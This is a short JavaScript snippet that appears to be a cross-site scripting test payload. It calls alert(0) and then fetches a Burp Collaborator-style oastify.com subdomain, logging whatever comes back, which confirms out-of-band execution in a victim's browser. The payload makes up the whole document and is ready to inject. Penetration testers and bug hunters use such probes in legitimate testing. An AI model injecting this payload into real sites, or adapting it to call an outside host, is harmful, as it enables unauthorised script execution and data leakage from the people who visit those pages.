alert(0),
fetch("https://b4glctqeaewg0fw84mimbi4r3i9fx6lv.oastify.com")
  .then(response => response.text())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
